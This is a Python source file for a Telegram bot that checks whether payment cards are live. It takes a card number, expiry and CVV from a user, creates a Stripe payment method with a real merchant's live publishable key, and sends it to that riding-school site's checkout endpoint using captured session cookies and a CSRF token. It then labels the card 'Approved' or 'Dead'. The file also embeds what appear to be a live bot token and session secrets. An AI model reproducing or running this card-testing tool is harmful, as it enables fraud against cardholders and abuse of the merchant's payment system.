import telebot
import requests
import re
import json

BOT_TOKEN = "7194711538:AAHiP8JKzuhuJx72REyy6sMsRdttaPdvWAY"
bot = telebot.TeleBot(BOT_TOKEN)

def parse_card_input(text):
    """
    Parse card input formats: CC|MM|YY|CVV or CC|MM|YYYY|CVV
    Accepts | or / as separator.
    """
    pattern = r'^(\d{12,19})[|/](\d{2})[|/](\d{2,4})[|/](\d{3,4})$'
    match = re.match(pattern, text.strip())
    if not match:
        return None
    cc, mm, yy, cvv = match.groups()
    if len(yy) == 4:
        yy = yy[2:]  # convert YYYY to YY
    return cc, mm, yy, cvv

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message,
        "Send me a card to check in format:\nCC|MM|YY|CVV\nor\nCC|MM|YYYY|CVV\nExample:\n4111111111111111|12|25|123")

@bot.message_handler(func=lambda m: True)
def check_card(message):
    card_data = parse_card_input(message.text)
    if not card_data:
        bot.reply_to(message, "❌ Invalid format. Please send card as CC|MM|YY|CVV or CC|MM|YYYY|CVV")
        return

    cc, mm, yy, cvv = card_data

    # Step 1: Create Stripe Payment Method
    stripe_url = "https://api.stripe.com/v1/payment_methods"
    stripe_payload = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'guid': 'df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59',
        'muid': '6efd7584-fee8-409c-ba33-05d29099f4f5019d63',
        'sid': 'cfd57606-d22f-4f3f-b5f7-e2131ab32cf5b79697',
        'pasted_fields': 'number',
        'payment_user_agent': 'stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; card-element',
        'referrer': 'https://www.bloomingriders.com',
        'time_on_page': '129736',
        'key': 'pk_live_pikg8Knzv9oPKaFnRwcld8xQ'
    }

    try:
        stripe_resp = requests.post(stripe_url, data=stripe_payload)
        stripe_resp.raise_for_status()
        stripe_json = stripe_resp.json()
    except Exception as e:
        bot.reply_to(message, f"🔴 Error connecting to Stripe API:\n{str(e)}")
        return

    if 'error' in stripe_json:
        error_msg = stripe_json['error'].get('message', 'Unknown Stripe error')
        bot.reply_to(message, f"❌ Stripe error: {error_msg}")
        return

    pm_id = stripe_json.get('id')
    if not pm_id:
        bot.reply_to(message, "❌ Failed get payment method ID from Stripe.")
        return

    # Step 2: Use pm_id in Bloomingriders API to create setup intent
    br_url = "https://www.bloomingriders.com/api/student/checkout/stripe/create-setup-intent"
    br_headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'origin': 'https://www.bloomingriders.com',
        'referer': 'https://www.bloomingriders.com/checkout/?product_type=membership&product_id=1702',
        'x-country-code': 'IQ',
        'x-csrf-token': 'I3tRBBIz-XqI1FLslr2bsea5YXKkHRJKKN2g',
        'cookie': 'NEXT_LOCALE_V2=eyJtZXNzYWdlIjoiZGVmYXVsdCJ9; ruccd=s%3AeyJtZXNzYWdlIjoiSVEiLCJwdXJwb3NlIjoicnVjY2QifQ.l1Nc5QUSiaUxDqv9FSqzTLXC6u_LQNZbvLnFCfaShEA; swuid=s%3AeyJtZXNzYWdlIjoiY21hamxoOG80MDF2a2FrOW5kMnFwYjJ2ZCIsInB1cnBvc2UiOiJzd3VpZCJ9.ZZ8EZkLYw4jTun6GiWudxlUuL0xFSDMsbLijKZY0-Eo; __stripe_mid=6efd7584-fee8-409c-ba33-05d29099f4f5019d63; __stripe_sid=cfd57606-d22f-4f3f-b5f7-e2131ab32cf5b79697',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
    }
    br_json = {
        "stripe_payment_method_uuid": pm_id,
        "checkout_stat_id": 613838,
        "product_id": 1702,
        "product_type": "membership"
    }

    try:
        br_resp = requests.post(br_url, headers=br_headers, json=br_json)
        br_resp.raise_for_status()
        br_json_resp = br_resp.json()
    except Exception as e:
        bot.reply_to(message, f"🔴 Error connecting to Bloomingriders API:\n{str(e)}")
        return

    # Check if "error" key exists in final response JSON
    if "error" in br_json_resp:
        result_msg = f"❌ Card Declined (Dead)\nError: {br_json_resp['error']}"
    else:
        result_msg = "✅ Card Approved (Success)"

    # Send full JSON response formatted nicely for transparency
    full_response = json.dumps(br_json_resp, indent=2, ensure_ascii=False)

    bot.reply_to(message, f"{result_msg}\n\nFull response:\n{full_response}")

bot.polling()
